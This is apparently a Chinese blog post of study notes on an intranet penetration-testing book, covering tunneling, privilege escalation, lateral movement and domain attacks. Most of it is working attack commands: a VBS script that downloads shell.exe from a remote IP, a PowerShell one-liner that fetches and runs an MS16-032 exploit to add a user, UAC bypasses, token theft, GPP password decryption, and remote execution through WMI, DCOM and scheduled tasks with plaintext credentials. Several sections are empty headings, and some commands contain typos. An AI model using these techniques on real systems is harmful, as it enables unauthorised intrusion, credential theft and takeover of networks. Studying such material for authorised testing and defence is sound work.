<h3 id="判断内网的连通性"><a href="#判断内网的连通性" class="headerlink" title="判断内网的连通性"></a>判断内网的连通性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">nc -zv 192.168.1.10 80</span><br><span class="line"></span><br><span class="line">curl www.baidu.com:80</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;curl的代理模式</span><br><span class="line">curl -x proxy-ip:port www.baidu.com</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;windows下的nslookup</span><br><span class="line">mslookup www.baidu.com vps-ip</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;linux下的dig</span><br><span class="line">dig @vps-ip www.baidu.com</span><br></pre></td></tr></table></figure>

<h2 id="2-网络层隧道技术"><a href="#2-网络层隧道技术" class="headerlink" title="2:网络层隧道技术"></a>2:网络层隧道技术</h2><h3 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h3><p>几种IPv6工具：socat、6tunnel、nt6tunnel</p>
<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><p><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
<h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p><a href="https://github.com/esrrhs/pingtunnel" target="_blank" rel="noopener">https://github.com/esrrhs/pingtunnel</a></p>
<h2 id="3-传输层隧道技术"><a href="#3-传输层隧道技术" class="headerlink" title="3:传输层隧道技术"></a>3:传输层隧道技术</h2><p>lcx</p>
<p>nc</p>
<p>powercat</p>
<h2 id="4-应用层隧道技术"><a href="#4-应用层隧道技术" class="headerlink" title="4:应用层隧道技术"></a>4:应用层隧道技术</h2><p>SSH协议</p>
<p>DNS协议</p>
<p>dnscat2</p>
<h2 id="5-SOCKS代理"><a href="#5-SOCKS代理" class="headerlink" title="5:SOCKS代理"></a>5:SOCKS代理</h2><p>earthworm</p>
<p>reGeorg</p>
<p>sSocks</p>
<p>SocksCap64</p>
<p>Proxifier</p>
<p>ProxyChains</p>
<h2 id="6-压缩数据"><a href="#6-压缩数据" class="headerlink" title="6:压缩数据"></a>6:压缩数据</h2><h3 id="rar-exe"><a href="#rar-exe" class="headerlink" title="rar.exe"></a>rar.exe</h3><p>将E:\webs\目录下的所有内容打包为1.rar放入E:\webs\目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar.exe a -k -r -s -m3 E:\webs\1.rar E:\webs\</span><br></pre></td></tr></table></figure>

<p>将E:\webs\1.rar解压到当前根目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar.exe e E:\webs\1.rar</span><br></pre></td></tr></table></figure>

<p>分卷压缩、解压</p>
<p>分卷压缩E盘API目录下的所有文件及文件夹，设置每个分卷为20M</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar.exe a -m0 -r -v20m E:\test.rar E:\API</span><br></pre></td></tr></table></figure>

<p>将E:\test.part01.rar解压到E盘的x1目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar.exe x E:\test.part01.rar E:\x1</span><br></pre></td></tr></table></figure>

<h3 id="7-Zip"><a href="#7-Zip" class="headerlink" title="7-Zip"></a>7-Zip</h3><h2 id="7-上传和下载"><a href="#7-上传和下载" class="headerlink" title="7:上传和下载"></a>7:上传和下载</h2><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><p>download.vbs代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set Post&#x3D;CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">Set shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">post.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;IP&#x2F;shell.exe&quot;,0</span><br><span class="line">post.Send()</span><br><span class="line">Set aGet &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode &#x3D; 3</span><br><span class="line">aGet.Type &#x3D; 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\test\shell.exe&quot;,2</span><br></pre></td></tr></table></figure>

<p>执行下面命令即可在目标主机上下载shell.exe文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cscript download.vbs</span><br></pre></td></tr></table></figure>

<h3 id="利用Debug"><a href="#利用Debug" class="headerlink" title="利用Debug"></a>利用Debug</h3><h3 id="利用Nishang上传"><a href="#利用Nishang上传" class="headerlink" title="利用Nishang上传"></a>利用Nishang上传</h3><h3 id="利用bitsadmin下载"><a href="#利用bitsadmin下载" class="headerlink" title="利用bitsadmin下载"></a>利用bitsadmin下载</h3><h1 id="第四章-权限提升分析及防御"><a href="#第四章-权限提升分析及防御" class="headerlink" title="第四章 权限提升分析及防御"></a>第四章 权限提升分析及防御</h1><p>这里提到了一个TrustedInstaller权限，Windows的最高权限。System无法修改系统文件，但是这个权限能够进行修改。</p>
<p>提权类型：</p>
<p>横向提权、纵向提权</p>
<h2 id="4-1-系统内核溢出漏洞提权分析及防范"><a href="#4-1-系统内核溢出漏洞提权分析及防范" class="headerlink" title="4.1 系统内核溢出漏洞提权分析及防范"></a>4.1 系统内核溢出漏洞提权分析及防范</h2><h3 id="通过手动执行命令发现缺失补丁"><a href="#通过手动执行命令发现缺失补丁" class="headerlink" title="通过手动执行命令发现缺失补丁"></a>通过手动执行命令发现缺失补丁</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查看当前权限</span><br><span class="line">whoami &#x2F;groups</span><br><span class="line"></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p>这个链接里也描述了一些方法和工具：<a href="https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/</a></p>
<p>可以通过对比KB来判断是否存在提权漏洞。</p>
<h3 id="MS16-032"><a href="#MS16-032" class="headerlink" title="MS16-032"></a>MS16-032</h3><p>可以使用Invoke-MS16-032.ps1工具:<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-MS16-032 -Application cmd.exe -Commandline &quot;&#x2F;c net user 1 1 &#x2F;add&quot;</span><br></pre></td></tr></table></figure>

<p>远程加载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1);Invoke-MS16-032 -Application cmd.exe -Commandline &quot;&#x2F;c net user 1 1 &#x2F;add&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>MS16-032的补丁编号为KB3139914</p>
<h3 id="利用MSF发现缺失补丁"><a href="#利用MSF发现缺失补丁" class="headerlink" title="利用MSF发现缺失补丁"></a>利用MSF发现缺失补丁</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>

<h3 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h3><p>将systeminfo信息输出到txt文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo &gt; info.txt</span><br></pre></td></tr></table></figure>

<p>windows-exploit-suggester下载地址：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;windows-exploit-suggester.py --update</span><br><span class="line">pip install xlrd --upgrade</span><br><span class="line">&#x2F;windows-exploit-suggester.py -d BulletinSearch.xlsx -i info.txt</span><br></pre></td></tr></table></figure>

<p><img src="4_1.png" alt=""></p>
<p>MSF中也存在此模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure>

<h3 id="Powershell中的Sherlock"><a href="#Powershell中的Sherlock" class="headerlink" title="Powershell中的Sherlock"></a>Powershell中的Sherlock</h3><p>下载地址：<a href="https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\sherlock.ps1</span><br><span class="line">find-AllVulns</span><br></pre></td></tr></table></figure>

<p><img src="4_2.png" alt=""></p>
<h2 id="4-2-Windows操作系统配置错误急用分析和防范"><a href="#4-2-Windows操作系统配置错误急用分析和防范" class="headerlink" title="4.2 Windows操作系统配置错误急用分析和防范"></a>4.2 Windows操作系统配置错误急用分析和防范</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>使用Powerup</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\Powerup.ps1</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键值AlwaysInstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限的用户都能以System权限用户安装MSI类型文件。不过需要开启了Windows installer特权安装功能才能有效果。</p>
<p>可以直接设置这两个注册表键值为1来进行开启：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p>PowerUp中也包含了这样的利用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\PowerUp.ps1</span><br><span class="line">&#x2F;&#x2F;检查注册表设置，如果输出True则表示注册表键值已经被设置</span><br><span class="line">Get-RegistryAlwaysInstalledElevated</span><br><span class="line">&#x2F;&#x2F;生成一个MSI文件</span><br><span class="line">Write-UserAddMSI</span><br><span class="line">&#x2F;&#x2F;允许文件则会添加一个管理员账户</span><br><span class="line">msiexec.exe &#x2F;q &#x2F;i UserAdd.msi</span><br></pre></td></tr></table></figure>

<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>这个漏洞在书中说明了利用方式，但是并没有说明根本原理，这个漏洞是由于使用CreateProcess函数创建进程时对第二个参数中的文件路径没有使用双引号括起来，这个不再说明了，在之前整理ATT&amp;CK的文档的时候已经弄过了很多遍。可以参考这个文档：<a href="https://www.cnblogs.com/sevck/p/8488469.html" target="_blank" rel="noopener">https://www.cnblogs.com/sevck/p/8488469.html</a></p>
<p>书中说到了一个查找漏洞存在的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;c &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>MSF中存在能够利用的模块（需要有session）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use trusted_service_path</span><br></pre></td></tr></table></figure>

<h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>利用的是网络管理员在内网中给多台机器配置环境的配置文件中的敏感信息，如密码等。常用配置文件目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysprep.inf</span><br><span class="line">sysprep.xml</span><br><span class="line">unattend.xml</span><br><span class="line">unattended.xml</span><br></pre></td></tr></table></figure>

<p>MSF中的利用模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_unattend</span><br></pre></td></tr></table></figure>

<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>查看当前计划任务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>

<p>这里提到了一个工具，AccessChk用于在Windows中运行一些系统或程序的高级查询，管理和故障排除工作。可以通过这个工具来查看指定目录的权限配置情况，如果当前权限有某个高权限的程序执行文件的写权限，那么就可以替换高权限文件进行权限提升。（这里说到的是使用计划任务来进行定时执行）</p>
<p>使用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;不弹框运行</span><br><span class="line">accesschk.exe &#x2F;accepteula</span><br><span class="line">&#x2F;&#x2F;这里原书中的命令空格被吞了，说的是列出某个驱动器下所有权限配置有缺陷的文件夹,但是使用了之后发现应该不会遍历所有的文件夹</span><br><span class="line">.\accesschk.exe -uwdqs Users c:\</span><br><span class="line">.\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br></pre></td></tr></table></figure>

<p><img src="4_3.png" alt=""></p>
<h3 id="Empire的Powerup模块"><a href="#Empire的Powerup模块" class="headerlink" title="Empire的Powerup模块"></a>Empire的Powerup模块</h3><h2 id="4-3-组策略首选项提权分析及防范"><a href="#4-3-组策略首选项提权分析及防范" class="headerlink" title="4.3 组策略首选项提权分析及防范"></a>4.3 组策略首选项提权分析及防范</h2><p>这个说的就是查找组策略配置文件中加密过的密码，主要就是Group.xml等文件。</p>
<p>可以直接使用PowerSploit中的Get-GPPPassword.ps1来获取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\Get-GPPpassword.ps1</span><br><span class="line">Get-GppPassword</span><br></pre></td></tr></table></figure>

<p>然后使用gpprefdecrypt.py脚本进行解密:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python gpprefdecrypt.py XXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>

<h2 id="4-4-绕过UAC提权分析及防范"><a href="#4-4-绕过UAC提权分析及防范" class="headerlink" title="4.4 绕过UAC提权分析及防范"></a>4.4 绕过UAC提权分析及防范</h2><h3 id="MSF中的bypassuac"><a href="#MSF中的bypassuac" class="headerlink" title="MSF中的bypassuac"></a>MSF中的bypassuac</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">set session X</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="MSF中的RunAs"><a href="#MSF中的RunAs" class="headerlink" title="MSF中的RunAs"></a>MSF中的RunAs</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">set session X</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>运行后目标主机会弹出一个UAC的框，需要点击是然后才回弹回一个新的session，如果弹回的不是system权限的session则可以使用getsystem命令提升</p>
<h3 id="Nishang中的Invoke-PsUACme模块"><a href="#Nishang中的Invoke-PsUACme模块" class="headerlink" title="Nishang中的Invoke-PsUACme模块"></a>Nishang中的Invoke-PsUACme模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;使用sysprep方法并执行默认的payload</span><br><span class="line">Invoke-PsUACme -Verbose</span><br><span class="line">&#x2F;&#x2F;使用oobe方法并执行默认的payload</span><br><span class="line">Invoke-PsUACme -methed oobe -Verbose</span><br><span class="line">&#x2F;&#x2F;使用oobe方法执行自定义的payload</span><br><span class="line">Invoke-PsUACme -methed oobe -Payload &quot;powershell -windowstyle hidden -e &lt;your encoded payload&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>可以使用payloadpath参数指定payload的路径。</p>
<h3 id="Empire中的bypassuac模块"><a href="#Empire中的bypassuac模块" class="headerlink" title="Empire中的bypassuac模块"></a>Empire中的bypassuac模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemodule privesc&#x2F;bypassuac</span><br></pre></td></tr></table></figure>

<h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><p>几个名词：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">access token访问令牌：代表访问控制操作主体的系统对象</span><br><span class="line">security token认证令牌或硬件令牌：是一种用于实现计算机身份校验的物理设备，例如U盾</span><br><span class="line">session token会话令牌：是交互会话中唯一的身份标识符</span><br></pre></td></tr></table></figure>

<p>伪造令牌攻击的核心是Kerberos协议。</p>
<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>MSF中的利用(已经有meterpreter)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br></pre></td></tr></table></figure>

<p><img src="4_4.png" alt=""></p>
<p>两种类型的令牌：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Delegation Tokens 授权令牌：支持交互式登录（例如可以通过远程桌面登录及访问）</span><br><span class="line">Impersonation Tokens 模拟令牌：支持非交互式的会话</span><br></pre></td></tr></table></figure>

<p>在MSF中可以选择使用某一个特定的TOKEN</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impersonate_token</span><br></pre></td></tr></table></figure>

<h3 id="Rotten-Potato本地提权分析"><a href="#Rotten-Potato本地提权分析" class="headerlink" title="Rotten Potato本地提权分析"></a>Rotten Potato本地提权分析</h3><p>利用的前提是系统中要存在有效的令牌，然后用这个工具快速模拟用户令牌，书中的环境存在SYSTEM的token，所以可以使用下面的命令进行窃取</p>
<p>下载地址：<a href="https://github.com/foxglovesec/RottenPotato.git" target="_blank" rel="noopener">https://github.com/foxglovesec/RottenPotato.git</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload &#x2F;opt&#x2F;RottenPotato&#x2F;rottenpotato.exe</span><br><span class="line">execute -HC -f rottenpotato.exe</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<h3 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h3><p>这里说到了使用MSF的migrate命令，借助system权限的进程进行执行命令</p>
<h3 id="Empire下的令牌窃取分析"><a href="#Empire下的令牌窃取分析" class="headerlink" title="Empire下的令牌窃取分析"></a>Empire下的令牌窃取分析</h3><p>这里说的是使用Empire下的creds命令和mimikatz模块进行pth攻击</p>
<h2 id="4-6-无凭证条件下的权限获取分析及防范"><a href="#4-6-无凭证条件下的权限获取分析及防范" class="headerlink" title="4.6 无凭证条件下的权限获取分析及防范"></a>4.6 无凭证条件下的权限获取分析及防范</h2><p>主要说了一下使用Responder进行欺骗</p>
<h1 id="第五章-域内横向移动分析及防御"><a href="#第五章-域内横向移动分析及防御" class="headerlink" title="第五章 域内横向移动分析及防御"></a>第五章 域内横向移动分析及防御</h1><h2 id="5-1-常用Windows远程连接和命令"><a href="#5-1-常用Windows远程连接和命令" class="headerlink" title="5.1 常用Windows远程连接和命令"></a>5.1 常用Windows远程连接和命令</h2><p>IPC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.10\ipc$ &quot;admin123&quot; &#x2F;user:administrator</span><br></pre></td></tr></table></figure>

<p>dir</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.1.10\c$</span><br></pre></td></tr></table></figure>

<p>tasklist</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist &#x2F;S 192.168.1.10 &#x2F;U administrator &#x2F;P admin123</span><br></pre></td></tr></table></figure>

<p>at：是Windows server 2008之前的计划任务命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.1.10 4:11PM C:\shell.bat</span><br></pre></td></tr></table></figure>

<p>创建之后会有一个任务ID，指定任务ID可以删除</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.1.10 7 &#x2F;delete</span><br></pre></td></tr></table></figure>

<p>schtasks</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.1.10 &#x2F;tn test &#x2F;sc onstart &#x2F;tr C:\calc.bat &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure>

<p>介绍了几种抓取本地账户密码和SAM中HASH值的方法，直接跳过了，可以参考ATT&amp;CK中的Credential Access一章</p>
<h2 id="5-6-WMI"><a href="#5-6-WMI" class="headerlink" title="5.6 WMI"></a>5.6 WMI</h2><p>基本的执行方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.1.10 &#x2F;user:administrator &#x2F;password:admin123 process call create &quot;cmd.exe&quot; &#x2F;c ipconfig &gt; ip.txt&quot;</span><br></pre></td></tr></table></figure>

<p>其他工具：</p>
<p>impacket中的wmiexec，成功连接之后会有一个交互式的命令行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py administrator:admin123@192.168.1.10</span><br></pre></td></tr></table></figure>

<p>wmiexec.vbs</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.1.10 administrator admin123</span><br><span class="line"></span><br><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd 192.168.1.10 administrator admin123 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>

<p>Invoke-WMICommand</p>
<p>Invoke-WMICommand是PowerSpolit中的脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; &quot;test\administrator&quot;</span><br><span class="line">$password &#x3D; ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force</span><br><span class="line">$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $password</span><br><span class="line">$remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.1.10</span><br><span class="line">$remote.PayloadOutput</span><br></pre></td></tr></table></figure>

<p>Invoke-WMIMethod是powershell自带的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; &quot;test\administrator&quot;</span><br><span class="line">$password &#x3D; ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force</span><br><span class="line">$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $password</span><br><span class="line">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;ipconfig&quot; -ComputerName &quot;192.168.1.10&quot; -Credential $Cred</span><br></pre></td></tr></table></figure>

<h2 id="5-8-SMBEXEC"><a href="#5-8-SMBEXEC" class="headerlink" title="5.8 SMBEXEC"></a>5.8 SMBEXEC</h2><p>Impacket中有这个插件</p>
<p>Linux版本下载地址：<a href="https://github.com/brav0hax/smbexec.git" target="_blank" rel="noopener">https://github.com/brav0hax/smbexec.git</a></p>
<p>安装命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.git</span><br><span class="line">chmod +x install.sh &amp;&amp; .&#x2F;install.sh</span><br></pre></td></tr></table></figure>

<h2 id="5-9-DCOM在远程系统中的使用"><a href="#5-9-DCOM在远程系统中的使用" class="headerlink" title="5.9 DCOM在远程系统中的使用"></a>5.9 DCOM在远程系统中的使用</h2><h3 id="通过本地DCOM执行命令"><a href="#通过本地DCOM执行命令" class="headerlink" title="通过本地DCOM执行命令"></a>通过本地DCOM执行命令</h3><p>获取DCOM程序列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>

<h3 id="使用DCOM在远程机器上执行命令"><a href="#使用DCOM在远程机器上执行命令" class="headerlink" title="使用DCOM在远程机器上执行命令"></a>使用DCOM在远程机器上执行命令</h3><p>1调用MMC20.Application远程执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.10 &quot;admin123&quot; &#x2F;user:test\xiaom</span><br><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.1.10&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c cmd.exe&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>2、调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.1.10&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$item &#x3D; $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)关于这个方法的详细内容可以参考文章：https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-226540-1.htm</span><br></pre></td></tr></table></figure>

<h2 id="5-10-SPN在域环境中的应用"><a href="#5-10-SPN在域环境中的应用" class="headerlink" title="5.10 SPN在域环境中的应用"></a>5.10 SPN在域环境中的应用</h2><h2 id="5-11-Exchange邮件服务器安全防范"><a href="#5-11-Exchange邮件服务器安全防范" class="headerlink" title="5.11 Exchange邮件服务器安全防范"></a>5.11 Exchange邮件服务器安全防范</h2><p>查看邮件数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询之前需要安装命令</span><br><span class="line">add-pssnapin microsoft.exchange *</span><br><span class="line">Get-MailboxDatabase -server &quot;Exchange1&quot;</span><br><span class="line">Get-MailboxDatabase -Identity &#39;Mailbox Database 1894576043&#39; | Format-List Name,EdbFilePath,LogFolderPath</span><br></pre></td></tr></table></figure>
<h1 id="第六章-域控制器安全"><a href="#第六章-域控制器安全" class="headerlink" title="第六章 域控制器安全"></a>第六章 域控制器安全</h1><h2 id="6-1-NTDS-dit"><a href="#6-1-NTDS-dit" class="headerlink" title="6.1 NTDS.dit"></a>6.1 NTDS.dit</h2><h2 id="6-2-导出ntds-dit中的散列值"><a href="#6-2-导出ntds-dit中的散列值" class="headerlink" title="6.2 导出ntds.dit中的散列值"></a>6.2 导出ntds.dit中的散列值</h2><h2 id="6-3-利用dcsync获取散列值"><a href="#6-3-利用dcsync获取散列值" class="headerlink" title="6.3 利用dcsync获取散列值"></a>6.3 利用dcsync获取散列值</h2><h2 id="6-4-使用MSF获取散列值"><a href="#6-4-使用MSF获取散列值" class="headerlink" title="6.4 使用MSF获取散列值"></a>6.4 使用MSF获取散列值</h2><h2 id="6-6-Kerberos与用户提权漏洞分析与防范"><a href="#6-6-Kerberos与用户提权漏洞分析与防范" class="headerlink" title="6.6 Kerberos与用户提权漏洞分析与防范"></a>6.6 Kerberos与用户提权漏洞分析与防范</h2><h1 id="第七章-跨域攻击分析与防御"><a href="#第七章-跨域攻击分析与防御" class="headerlink" title="第七章 跨域攻击分析与防御"></a>第七章 跨域攻击分析与防御</h1><h2 id="7-2-利用域信任关系的跨域攻击分析"><a href="#7-2-利用域信任关系的跨域攻击分析" class="headerlink" title="7.2 利用域信任关系的跨域攻击分析"></a>7.2 利用域信任关系的跨域攻击分析</h2><h3 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h3><p>这里说到了lg.exe这个工具，能够用来枚举远程主机用户和组的信息。</p>
